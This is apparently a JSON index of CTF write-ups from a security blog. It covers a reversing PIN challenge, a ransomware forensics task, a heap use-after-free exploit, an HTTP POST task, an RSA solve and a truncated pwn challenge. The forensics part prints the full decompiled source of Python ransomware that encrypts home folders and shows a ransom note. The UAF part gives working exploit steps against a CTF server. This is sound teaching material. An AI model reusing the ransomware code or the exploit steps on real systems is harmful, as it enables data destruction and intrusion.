0x00000000004005c6 \u0026lt;+16\u0026gt;: jne 0x4005cf \u0026lt;cek+25\u0026gt; 0x00000000004005c8 \u0026lt;+18\u0026gt;: mov eax,0x1 0x00000000004005cd \u0026lt;+23\u0026gt;: jmp 0x4005d4 \u0026lt;cek+30\u0026gt; 0x00000000004005cf \u0026lt;+25\u0026gt;: mov eax,0x0 0x00000000004005d4 \u0026lt;+30\u0026gt;: pop rbp 0x00000000004005d5 \u0026lt;+31\u0026gt;: ret End of assembler dump.  We can set a breakpoint at the comparison instruction so that we can see what PIN it expects:\ngef➤ break *cek+13 Breakpoint 1 at 0x4005c3  Now we can run the code and enter whatever PIN:\ngef➤ run Starting program: ./rev1 Masukan PIN = 1234 Breakpoint 1, 0x00000000004005c3 in cek ()  And we reach the breakpoint. The expected PIN is stored in $eax (and also in a global variable called valid):\ngef➤ p/x $eax $1 = 0x51615 gef➤ p/d $eax $2 = 333333 gef➤ p/d (int) valid $3 = 333333 gef➤ quit  Now we have the correct PIN (333333):\n$ ./rev1 Masukan PIN = 333333 PIN benar !  So the flag is: CTFlearn{333333}.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/reverse-engineering/pin/","section":"ctf","summary":"Debugging program to find a PIN","time":2,"title":"PIN"},{"contents":"We are given some files:\n$ unzip -l forensics_poof.zip Archive: forensics_poof.zip Length Date Time Name ---------- ---------- ----- ---- 2567089 10-20-2022 11:12 candy_dungeon.pdf.boo 1096901984 10-20-2022 18:11 mem.dmp 7839830 10-20-2022 11:25 poof_capture.pcap 1126698 10-20-2022 12:04 Ubuntu_4.15.0-184-generic_profile.zip ---------- ------- 1108435601 4 files  And we have an endpoint to connect to and answer some questions:\n$ nc 159.65.48.79 31240 +-------+-----------------------------------------------------+ | Title | Description | +-------+-----------------------------------------------------+ | POOF | In my company, we are developing a | | | new python game for Halloween. I'm the | | | leader of this project; thus, I want | | | it to be unique. So I researched | | | the most cutting-edge python libraries for game | | | development until I stumbled upon a private | | | discord server. One member suggested I try | | | a new python library that provides enhanced | | | game development capabilities. I was excited about | | | it until I tried it. Quite simply, | | | all my files are encrypted now. Thankfully | | | I manage to capture the memory and | | | the network traffic of my Linux server | | | during the incident. Can you analyze it | | | and help me recover my files? | | | | +-------+-----------------------------------------------------+ Which is the malicious URL that the ransomware was downloaded from? (for example: http://maliciousdomain/example/file.extension) \u0026gt;  Network analysis Let\u0026rsquo;s open poof_capture.pcap in Wireshark:\nThe first HTTP message is a GET request to\n/packages/a5/61/caf3af6d893b5cb8eae9a90a3054f370a92130863450e3299d742c7a65329d94/pygaming-dev-13.37.tar.gz  in host files.pypi-install.com. It looks suspicious, let\u0026rsquo;s try this URL:\nWhich is the malicious URL that the ransomware was downloaded from? (for example: http://maliciousdomain/example/file.extension) \u0026gt; http://files.pypi-install.com/packages/a5/61/caf3af6d893b5cb8eae9a90a3054f370a92130863450e3299d742c7a65329d94/pygaming-dev-13.37.tar.gz [+] Correct! What is the name of the malicious process? (for example: malicious) \u0026gt;  Process enumeration The intended way to solve this is using files mem.dmp and profile Ubuntu_4.15.0-184-generic_profile.zip with volatility. However, we can guess that the process name is the same as the filename that was executed.\nTherefore, let\u0026rsquo;s extract pygaming-dev-13.37.tar.gz from Wireshark and uncompress it:\n$ file pygaming-dev-13.37.tar.gz pygaming-dev-13.37.tar.gz: gzip compressed data, last modified: Thu Oct 20 09:03:07 2022, from Unix, original size modulo 2^32 7505920 $ tar xvfz pygaming-dev-13.37.tar.gz x pygaming-dev-13.37/ x pygaming-dev-13.37/configure $ file pygaming-dev-13.37/configure pygaming-dev-13.37/configure: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ac40f3d3f795f9ee657f59a09fbedea23c4d7e25, for GNU/Linux 2.6.32, stripped  So, the binary file is configure, which usually matches the process name when it is executed:\nWhat is the name of the malicious process? (for example: malicious) \u0026gt; configure [+] Correct! Provide the md5sum of the ransomware file. \u0026gt;  And indeed it is.\nBinary analysis Now we are asked for the md5sum of the binary file:\n$ md5sum pygaming-dev-13.37/configure 7c2ff873ce6b022663a1f133383194cc pygaming-dev-13.37/configure  Provide the md5sum of the ransomware file. \u0026gt; 7c2ff873ce6b022663a1f133383194cc [+] Correct! Which programming language was used to develop the ransomware? (for example: nim) \u0026gt;  And also the programming language used to build the binary. We can try some well-known programming languages, and find out that it is built with Python:\n$ strings pygaming-dev-13.37/configure | grep python blib-dynload/_bz2.cpython-36m-x86_64-linux-gnu.so blib-dynload/_codecs_cn.cpython-36m-x86_64-linux-gnu.so blib-dynload/_codecs_hk.cpython-36m-x86_64-linux-gnu.so blib-dynload/_codecs_iso2022.cpython-36m-x86_64-linux-gnu.so blib-dynload/_codecs_jp.cpython-36m-x86_64-linux-gnu.so blib-dynload/_codecs_kr.cpython-36m-x86_64-linux-gnu.so blib-dynload/_codecs_tw.cpython-36m-x86_64-linux-gnu.so blib-dynload/_ctypes.cpython-36m-x86_64-linux-gnu.so blib-dynload/_hashlib.cpython-36m-x86_64-linux-gnu.so blib-dynload/_lzma.cpython-36m-x86_64-linux-gnu.so blib-dynload/_multibytecodec.cpython-36m-x86_64-linux-gnu.so blib-dynload/_opcode.cpython-36m-x86_64-linux-gnu.so blib-dynload/_ssl.cpython-36m-x86_64-linux-gnu.so blib-dynload/readline.cpython-36m-x86_64-linux-gnu.so blib-dynload/resource.cpython-36m-x86_64-linux-gnu.so blib-dynload/termios.cpython-36m-x86_64-linux-gnu.so blibpython3.6m.so.1.0 2libpython3.6m.so.1.0  Which programming language was used to develop the ransomware? (for example: nim) \u0026gt; python [+] Correct! After decompiling the ransomware, what is the name of the function used for encryption? (for example: encryption) \u0026gt;  Extracting Python source code Since we know that the binary is compiled from Python, we can use pyinstxtractor to extract Python bytecode (.pyc files). These tools work better with Python 2.7, so we can use a Docker container:\n$ docker run --rm -v \"$(pwd)\":/home/rocky -it python:2.7 bash root@18a2ef058c02:/# cd root@18a2ef058c02:~# git clone https://github.com/extremecoders-re/pyinstxtractor.git ... root@18a2ef058c02:~# python pyinstxtractor/pyinstxtractor.py /home/rocky/configure [+] Processing /home/rocky/configure [+] Pyinstaller version: 2.1+ [+] Python version: 3.6 [+] Length of package: 7448520 bytes [+] Found 79 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_subprocess.pyc [+] Possible entry point: pyi_rth_pkgutil.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: configure.pyc [!] Warning: This script is running in a different Python version than the one used to build the executable. [!] Please run this script in Python 3.6 to prevent extraction errors during unmarshalling [!] Skipping pyz extraction [+] Successfully extracted pyinstaller archive: /home/rocky/configure You can now use a python decompiler on the pyc files within the extracted directory root@18a2ef058c02:~# ls configure_extracted/ Crypto\tconfigure.pyc\tlibexpat.so.1\tlibreadline.so.7\tpyi_rth_inspect.pyc\tpyimod01_os_path.pyc\tstruct.pyc PYZ-00.pyz\tlib-dynload\tlibffi.so.6\tlibssl.so.1.1\tpyi_rth_pkgutil.pyc\tpyimod02_archive.pyc PYZ-00.pyz_extracted libbz2.so.1.0\tliblzma.so.5\tlibtinfo.so.5\tpyi_rth_subprocess.pyc\tpyimod03_importers.pyc base_library.zip libcrypto.so.1.1\tlibpython3.6m.so.1.0 libz.so.1\tpyiboot01_bootstrap.pyc pyimod04_ctypes.pyc  Now, we can use another tool called uncompyle6:\nroot@18a2ef058c02:~# pip install uncompyle6 ... root@18a2ef058c02:~# uncompyle6 configure_extracted/configure.pyc  # uncompyle6 version 3.8.0 # Python bytecode 3.6 (3379) # Decompiled from: Python 2.7.18 (default, Apr 21 2020, 09:53:40) # [GCC 8.3.0] # Warning: this version of Python has problems handling the Python 3 byte type in constants properly. # Embedded file name: configure.py fromCrypto.CipherimportAES importrandom, string, time, os defPkrr1fe0qmDD9nKx(filename: str, data: bytes) -\u0026gt; None: open(filename, 'wb').write(data) os.rename(filename, f\"{filename}.boo\") defmv18jiVh6TJI9lzY(filename: str) -\u0026gt; None: data=open(filename, 'rb').read() key='vN0nb7ZshjAWiCzv' iv=b'ffTC776Wt59Qawe1' cipher=AES.new(key.encode('utf-8'), AES.MODE_CFB, iv) ct=cipher.encrypt(data) Pkrr1fe0qmDD9nKx(filename, ct) defw7oVNKAyN8dlWJk() -\u0026gt; str: letters=string.ascii_lowercase+string.digits _id=''.join(random.choice(letters) foriinrange(32)) return_id defprint_note() -\u0026gt; None: _id=w7oVNKAyN8dlWJk() banner=f\"\\n\\nPippity poppity give me your property!\\n\\n\\t* ((((\\n* * * (((\\n\\t* ((( *\\n* / \\\\* *((( \\n__/___\\\\__ * (((\\n\\t(O) | * ((((\\n* '\u0026lt; ? |__ ... .. . *\\n\\t\\\\@ \\\\* ... . . . *\\n\\t//__ \\t// ||\\\\__ \\\\|~~~~~~ . . . *\\n====M===M===| |=====|~~~~~~ . . .. .. .\\n\\t\\t* \\\\\\\\\\\\|~~~~~~ *\\n* \u0026lt;__|_| ~~~~~~ . . ... .\\n\\t\\nPOOF!\\n\\nDon't you speak English? Use https://translate.google.com/?sl=en\u0026amp;tl=es\u0026amp;op=translate\\n\\nYOU GOT TRICKED! Your home folder has been encrypted due to blind trust.\\nTo decrypt your files, you need the private key that only we possess. \\n\\nYour ID: {_id}\\n\\nDon't waste our time and pay the ransom; otherwise, you will lose your precious files forever.\\n\\nWe accept crypto or candy.\\n\\nDon't hesitate to get in touch with cutie_pumpkin@ransomwaregroup.com during business hours.\\n\\n\\t\" print(banner) time.sleep(60) defyGN9pu2XkPTWyeBK(directory: str) -\u0026gt; list: filenames=[] forfilenameinos.listdir(directory): result=os.path.join(directory, filename) ifos.path.isfile(result): filenames.append(result) else: filenames.extend(yGN9pu2XkPTWyeBK(result)) returnfilenames defmain() -\u0026gt; None: username=os.getlogin() directories=[ f\"/home/{username}/Downloads\", f\"/home/{username}/Documents\", f\"/home/{username}/Desktop\"] fordirectoryindirectories: ifos.path.exists(directory): files=yGN9pu2XkPTWyeBK(directory) forfilinfiles: try: mv18jiVh6TJI9lzY(fil) exceptExceptionase: pass print_note() if__name__=='__main__': main() # okay decompiling configure_extracted/configure.pyc  We are asked for the name of the function that encrypts data, and it is mv18jiVh6TJI9lzY, which uses AES encryption:\nAfter decompiling the ransomware, what is the name of the function used for encryption? (for example: encryption) \u0026gt; mv18jiVh6TJI9lzY [+] Correct! Decrypt the given file, and provide its md5sum. \u0026gt;  Now we need to take the given file, decrypt it and find its md5sum. We have the key and the IV for the AES cipher, so decryption is easy:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; from hashlib import md5 \u0026gt;\u0026gt;\u0026gt; data = open('candy_dungeon.pdf.boo', 'rb').read() \u0026gt;\u0026gt;\u0026gt; key = b'vN0nb7ZshjAWiCzv' \u0026gt;\u0026gt;\u0026gt; iv = b'ffTC776Wt59Qawe1' \u0026gt;\u0026gt;\u0026gt; cipher = AES.new(key, AES.MODE_CFB, iv) \u0026gt;\u0026gt;\u0026gt; md5(cipher.decrypt(data)).hexdigest() '3bc9f072f5a7ed4620f57e6aa8d7e1a1'  Flag Once we introduce the MD5 hash, we will get the flag:\nDecrypt the given file, and provide its md5sum. \u0026gt; 3bc9f072f5a7ed4620f57e6aa8d7e1a1 [+] Correct! [+] Here is the flag: HTB{n3v3r_tru5t_4ny0n3_3sp3c14lly_dur1ng_h4ll0w33n}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/poof/","section":"ctf","summary":"Network traffic analysis with Wireshark. Binary analysis","time":6,"title":"POOF"},{"contents":"We are given a 64-bit binary called login:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  We also have the C source code:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int menu() { printf(\"*** WINBLOWS LOGIN *********\\n\" \"1. Login into user.\\n\" \"2. Sign out.\\n\" \"3. Print flag.\\n\" \"4. Lock user.\\n\" \"5. Restore user.\\n\" \"\u0026gt; \"); int resp = 0; scanf(\"%d\", \u0026amp;resp); while (getchar() != '\\n'); return resp; } struct creds { void *padding; char name[32]; int admin; }; struct creds *curr; struct creds *save; char *fake_flag; int main() { char buff[64]; setbuf(stdout, NULL); setbuf(stdin, NULL); while (1) { switch (menu()) { case 1: // Login curr = malloc(sizeof(*curr)); printf(\"Username: \"); fgets(curr-\u0026gt;name, sizeof(curr-\u0026gt;name), stdin); strtok(curr-\u0026gt;name, \"\\n\"); curr-\u0026gt;admin = 0; break; case 2: // Sign out if (!curr) { puts(\"You are not logged in!\"); break; } free(curr); curr = NULL; puts(\"You have been successfully logged out.\"); break; case 3: // Print flag if (curr \u0026amp;\u0026amp; curr-\u0026gt;admin) { puts(\"Here's your flag:\"); system(\"/bin/cat /flag.txt\"); } else { if (!fake_flag) { puts(\"You are not admin. Would you like to create a new flag instead?\"); fgets(buff, sizeof(buff), stdin); fake_flag = strdup(buff); } printf(\"Here's your flag: %s\", fake_flag); } break; case 4: // Lock user if (curr == NULL) { puts(\"You are not logged in!\"); break; } puts(\"User has been locked now.\"); save = curr; break; case 5: // Restore user if (curr != NULL) { puts(\"You are already logged. Sign out first!\"); } else if (save == NULL) { puts(\"No user is currently locked!\"); } else { printf(\"Welcome back, %s!\\n\", save-\u0026gt;name); curr = save; save = NULL; } break; default: puts(\"Invalid choice\"); } } }  The program has five options:\n Login as a new user Log out Print the flag or enter a fake flag Backup a user Restore backup  Some key things about the program:\n Users are stored on the heap because it is using malloc There are two pointers to a struct cred, which are: curr and save If we log out (2), then curr will be released using free and set to NULL If we print the flag (3) and we are not admin, then we can enter a fake_flag that will be saved using strdup If we print the flag (3) and we are admin, we get the real flag We can backup a user stored in curr into save if we are authenticated We can restore a user from save to curr if we are not authenticated  This program is vulnerable to Use After Free, which consists of releasing an object on the heap and use it again after.\nRemember that free does not remove the data from the heap, it just marks the chunk as unused.\nThe Use After Free vulnerability cames from the use of strdup after realising the curr pointer. The function strdup allocates a string on the heap using malloc with an amount of bytes equal to the length of the string. The behavior of malloc is to allocate a certain amount of bytes on the heap, however, this process can be faster if malloc is able to reuse a recently released chunk. Hence, if we release curr and then enter a string for strdup with the same size as the chunk for curr had, the string will be stored there.\nLet\u0026rsquo;s visualize it in GDB. First, we login (1):\n$ gdb -q login Reading symbols from login... (No debugging symbols found in login) gef➤ break menu Breakpoint 1 at 0xa1e gef➤ run Starting program: ./login Breakpoint 1, 0x0000555555400a1e in menu ()  gef➤ continue Continuing. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 1 Username: AAAABBBBCCCC Breakpoint 1, 0x0000555555400a1e in menu ()  Now we can easily find this username in memory:\ngef➤ grep AAAABBBBCCCC [+] Searching 'AAAABBBBCCCC' in memory [+] In '[heap]'(0x555555603000-0x555555624000), permission=rw- 0x5555556032a8 - 0x5555556032b4 → \"AAAABBBBCCCC\" gef➤ x/20x 0x555555603290 0x555555603290: 0x00000000 0x00000000 0x00000041 0x00000000 0x5555556032a0: 0x00000000 0x00000000 0x41414141 0x42424242 0x5555556032b0: 0x43434343 0x00000000 0x00000000 0x00000000 0x5555556032c0: 0x00000000 0x00000000 0x00000000 0x00000000 0x5555556032d0: 0x00000000 0x00000000 0x00020d31 0x00000000  Notice that I examined a few bytes before the match to watch the whole structure and the chunk metadata (0x41), which means that the whole chunk has 0x40 (or 64) bytes reserved and the previous chunk is in use (0x41 end in 1).\nNow we can call free by signing out (2):\ngef➤ continue Continuing. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 2 You have been successfully logged out. Breakpoint 1, 0x0000555555400a1e in menu ()  If we check again the heap, we will notice some differences:\ngef➤ x/20x 0x555555603290 0x555555603290: 0x00000000 0x00000000 0x00000041 0x00000000 0x5555556032a0: 0x00000000 0x00000000 0x55603010 0x00005555 0x5555556032b0: 0x43434343 0x00000000 0x00000000 0x00000000 0x5555556032c0: 0x00000000 0x00000000 0x00000000 0x00000000 0x5555556032d0: 0x00000000 0x00000000 0x00020d31 0x00000000  Now, the username has been overwritten with the address of the previous chunk.\nLet\u0026rsquo;s see what happens if we enter a fake_flag using strdup (3) with a small length:\ngef➤ continue Continuing. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 3 You are not admin. Would you like to create a new flag instead? EEEE Here's your flag: EEEE Breakpoint 1, 0x0000555555400a1e in menu ()  This is the heap at this point:\ngef➤ x/28x 0x555555603290 0x555555603290: 0x00000000 0x00000000 0x00000041 0x00000000 0x5555556032a0: 0x00000000 0x00000000 0x55603010 0x00005555 0x5555556032b0: 0x43434343 0x00000000 0x00000000 0x00000000 0x5555556032c0: 0x00000000 0x00000000 0x00000000 0x00000000 0x5555556032d0: 0x00000000 0x00000000 0x00000021 0x00000000 0x5555556032e0: 0x45454545 0x0000000a 0x00000000 0x00000000 0x5555556032f0: 0x00000000 0x00000000 0x00020d11 0x00000000  We can see that EEEE (and new line character) was stored on the heap in another chunk (size 0x20, 32). The function strdup will reserve enough memory to store the actual length of the string (the nearest multiple of 16 greater than or equal to the actual size). Notice that we have 16 bytes for the chunk metadata and 5 bytes for the string, so the nearest multiple of 16 is 32.\nThe Use After Free vulnerability comes when malloc finds a recently released chunk, and this happens if malloc needs to allocate the same amount of bytes that the released chunk had. Hence, if we enter a fake_flag that has enough length, its chunk metadata will be 0x41 and therefore malloc will reuse the released chunk.\nWe can repeat the previous process until entering the fake_flag:\ngef➤ continue Continuing. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 3 You are not admin. Would you like to create a new flag instead? EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE Here's your flag: EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE Breakpoint 1, 0x0000555555400a1e in menu ()  We have entered 48 characters. This is the heap now:\ngef➤ x/28x 0x555555603290 0x555555603290: 0x00000000 0x00000000 0x00000041 0x00000000 0x5555556032a0: 0x45454545 0x45454545 0x45454545 0x45454545 0x5555556032b0: 0x45454545 0x45454545 0x45454545 0x45454545 0x5555556032c0: 0x45454545 0x45454545 0x45454545 0x45454545 0x5555556032d0: 0x0000000a 0x00000000 0x00020d31 0x00000000 0x5555556032e0: 0x00000000 0x00000000 0x00000000 0x00000000 0x5555556032f0: 0x00000000 0x00000000 0x00000000 0x00000000  At this moment, if there was a user structure in that heap chunk, it would have an attribute admin != 0, so we could read the real flag.\nNevertheless, when the pointer curr is freed, it is also set to NULL. Fortunately, we have the option to backup the current pointer into save and afterwards recover the same pointer, so that we get what we want.\nSo, this will be the exploiting process:\n Login as any user using malloc (1) Backup curr into save (4) Log out to call free (2) Enter a fake_flag with 48 bytes length (3) Restore save into curr (5) Print the real flag (3)  Let\u0026rsquo;s do it directly on server side:\n$ nc thekidofarcrania.com 13226 *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 1 Username: user *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 4 User has been locked now. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 2 You have been successfully logged out. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 3 You are not admin. Would you like to create a new flag instead? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Here's your flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 5 Welcome back, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ! *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 3 Here's your flag: CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP} *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; ^C  And using a \u0026ldquo;one-liner\u0026rdquo;, we can extract just the flag:\n$ python3 -c 'print(\"\\n\".join([\"1\", \"user\", \"4\", \"2\", \"3\", \"A\" * 48, \"5\", \"3\"]))' | timeout 1 nc thekidofarcrania.com 13226 | grep CTFlearn CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/binary/poor-login/","section":"ctf","summary":"64-bit binary. Heap exploitation. Use After Free","time":8,"title":"Poor Login"},{"contents":"We are told to authenticate on a given URL using a POST request.\nFirst of all, let\u0026rsquo;s make a GET request to check if we can have the credentials, using curl:\n$ curl http://165.227.106.113/post.php \u0026lt;h1%gt;This site takes POST data that you have not submitted!\u0026lt;/h1\u0026gt;\u0026lt;!-- username: admin | password: 71urlkufpsdnlkadsf --\u0026gt;  And there we have it. Now we only need to use a POST request with this information. Using -d on curl to enter the request body sets the request method to POST by default, so there is no need to specify -X POST:\n$ curl http://165.227.106.113/post.php -d 'username=admin\u0026password=71urlkufpsdnlkadsf' \u0026lt;h1\u0026gt;CTFlearn{p0st_d4t4_4ll_d4y}\u0026lt;/h1\u0026gt;  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/web/post-practice/","section":"ctf","summary":"HTTP POST request","time":1,"title":"POST Practice"},{"contents":"We are given this Python source code that encrypts the flag:\nfromCrypto.Util.numberimport* p=getPrime(1024) q=getPrime(1024) n=p*q e=65537 m=bytes_to_long(open(\"flag.txt\", \"rb\").read().strip()) c=pow(m, e, n) pqqp=(pow(p, q, n) +pow(q, p, n)) %n print(f\"{n= }\") print(f\"{e= }\") print(f\"{c= }\") print(f\"{pqqp= }\")  And we have the output.txt file:\nn = 19678109133542698592305708016218863883460540049917712329432013892172528110292745184992950044286234053071380305255840348326164548510255147118470308166391801316954651278311516797693549738950638924838729113122082201649970553380521265027078990142823602788816122841173521655481024888439982252740049512798598085061773695717897738054691150959372485365062487195925100664710335322057804378500514036943988819273662050112952925141139754952427282840502980857190361170607335143494354546987865462698409956206631411308141753183566771545343693446609738596094372008339052131415140340456565555396933183573996686236769224009352680776141 e = 65537 c = 4072247787644405517693225466780406787448185227848467266590680538951503737695652776519815815044794587161578707809819763441075707137469351267404539758695849074266727221320662086207093016080297854717488042255308770890593983978724257303414642859978484084458380098954259220304333391581145689059564973907676661078965777905977665249069877734867259119271333543347675967002480182290529431802723432351160734165536930587939120516653618367482414081000718254774375447568464759357446892747598177493342245946293460645987948522541784101210339329312458616738544161953857715180345325332187115407714964472659039920532267119264418919947 pqqp = 286274681617083968101800572253589724107707315933733496895870570711787172051691156975540599189839527166581986519156360694553593020374681020209511667035419131460916677948315029070571749042370272329205309015536090768801019566664262350433731622252363771741528214379501493482631649996976367966453784254842455722642  First of all, we need to express $p^q + q^p \\pmod{n}$ in another way.\nBy Fermat\u0026rsquo;s Little Theorem, we know that:\n$$ p^q \\equiv p \\mod{q} \\Longrightarrow p^{q - 1} \\equiv 1 \\mod{q} $$\nSo,\n$$ p^{q - 1} = k \\cdot q + 1 \\Longrightarrow p^q = p (k \\cdot q + 1) ; k \\in \\mathbb{Z} $$\nAnd similarly, $q^p = q (l \\cdot p + 1)$ for $l \\in \\mathbb{Z}$\nHence,\n$$ \\begin{align} p^q + q^p \u0026amp; = p \\cdot (k \\cdot q + 1) + q \\cdot (l \\cdot p + 1) \\newline \u0026amp; = (k + l) \\cdot pq + p + q \\newline \u0026amp; = (k + l) \\cdot n + p + q \\end{align} $$\nAnd therefore $p^q + q^p \\equiv p + q \\pmod{m}$, which is crucial for decrypting RSA.\nWe need to find $d = e^{-1} \\pmod{\\phi(n)}$, and\n$$ \\phi(n) = (p - 1) \\cdot (q - 1) = pq - (p + q) + 1 = n - (p + q) + 1 $$\nThen we\u0026rsquo;ll decrypt the ciphertext as $m = c^d \\pmod{n}$.\nWe can do everything in Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; n = 19678109133542698592305708016218863883460540049917712329432013892172528110292745184992950044286234053071380305255840348326164548510255147118470308166391801316954651278311516797693549738950638924838729113122082201649970553380521265027078990142823602788816122841173521655481024888439982252740049512798598085061773695717897738054691150959372485365062487195925100664710335322057804378500514036943988819273662050112952925141139754952427282840502980857190361170607335143494354546987865462698409956206631411308141753183566771545343693446609738596094372008339052131415140340456565555396933183573996686236769224009352680776141 \u0026gt;\u0026gt;\u0026gt; e = 65537 \u0026gt;\u0026gt;\u0026gt; c = 4072247787644405517693225466780406787448185227848467266590680538951503737695652776519815815044794587161578707809819763441075707137469351267404539758695849074266727221320662086207093016080297854717488042255308770890593983978724257303414642859978484084458380098954259220304333391581145689059564973907676661078965777905977665249069877734867259119271333543347675967002480182290529431802723432351160734165536930587939120516653618367482414081000718254774375447568464759357446892747598177493342245946293460645987948522541784101210339329312458616738544161953857715180345325332187115407714964472659039920532267119264418919947 \u0026gt;\u0026gt;\u0026gt; pqqp = 286274681617083968101800572253589724107707315933733496895870570711787172051691156975540599189839527166581986519156360694553593020374681020209511667035419131460916677948315029070571749042370272329205309015536090768801019566664262350433731622252363771741528214379501493482631649996976367966453784254842455722642 \u0026gt;\u0026gt;\u0026gt; phi_n = n - pqqp + 1 \u0026gt;\u0026gt;\u0026gt; d = pow(e, -1, phi_n) \u0026gt;\u0026gt;\u0026gt; m = pow(c, d, n) \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'ictf{can_you_proof_that_p^q+q^p_is_actually_p+q?}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/pqqp/","section":"ctf","summary":"ImaginaryCTF 07/09/2022. 75 points. RSA. Fermat's Little Theorem","time":2,"title":"pqqp"},{"contents":"This challenge is only an introduction. It shows the flag directly: CTFlearn{4m_1_4_r3al_h4ck3r_y3t}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/miscellaneous/practice-flag/","section":"ctf","summary":"Introduction to CTF","time":1,"title":"Practice Flag"},{"contents":"We are given a 64-bit binary called pumpkin_stand:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/'  Reverse engineering If we load the binary in Ghidra, we will see this decompiled C code for main:\nvoidmain() { longin_FS_OFFSET; shortoption; shortamount; FILE *fp; undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 canary;  canary =*(undefined8 *) (in_FS_OFFSET +0x28); setup(); banner(); option =0; amount =0; while(true) { while(true) { while(true) { while(true) { menu(); __isoc99_scanf(\"%d\", \u0026amp;option); printf(\"\\nHow many do you want?\\n\\n\u0026gt;\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;amount); if(0\u0026lt;amount) break; printf(\"%s\\n[-] You cannot buy less than 1!\\n\", \u0026amp;DAT_0010134a); } pumpcoins =pumpcoins -amount *(short) *(undefined4 *) ((long) \u0026amp;values +(long) (int) option *4); if(-1\u0026lt;pumpcoins) break; printf(\"\\nCurrent pumpcoins: [%s%d%s]\\n\\n\", \u0026amp;DAT_00100e80, (ulong) (uint) (int) pumpcoins); printf(\"%s\\n[-] Not enough pumpcoins for this!\\n\\n%s\", \u0026amp;DAT_0010134a, \u0026amp;DAT_00100e78); } if(option !=1) break; printf(\"\\nCurrent pumpcoins: [%s%d%s]\\n\\n\", \u0026amp;DAT_00100e80, (ulong) (uint) (int)pumpcoins); puts(\"\\nGood luck crafting this huge pumpkin with a shovel!\\n\"); } if(9998\u0026lt;pumpcoins) break; printf(\"%s\\n[-] Not enough pumpcoins for this!\\n\\n%s\", \u0026amp;DAT_0010134a, \u0026amp;DAT_00100e78); } local_48 =0; local_40 =0; local_38 =0; local_30 =0; local_28 =0; local_20 =0; fp =fopen(\"./flag.txt\", \"rb\"); if(fp !=NULL) { fgets((char*) \u0026amp;local_48, 0x30, fp); printf(\"%s\\nCongratulations, here is the code to get your laser:\\n\\n%s\\n\\n\", \u0026amp;DAT_00100ee3, \u0026amp;local_48); /* WARNING: Subroutine does not return */ exit(0x16); } puts(\"Error opening flag.txt, please contact an Administrator!\\n\"); /* WARNING: Subroutine does not return */ exit(1); }  Basically, the program provides this menu:\n$ nc 134.122.106.203 32141 ##\u0026 (#\u0026\u0026 ##\u0026\u0026 ,*. #%%\u0026 .*, .\u0026@@@@#@@@\u0026@@@@@@@@@@@@\u0026@@\u0026@#@@@@@@( /@@@@\u0026@\u0026@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@\u0026@@@@, @@@@@@@@@@@@@\u0026@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@\u0026@@@@@@\u0026@@@@@@ #\u0026@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026#@@@@@@@@@@@@@@, 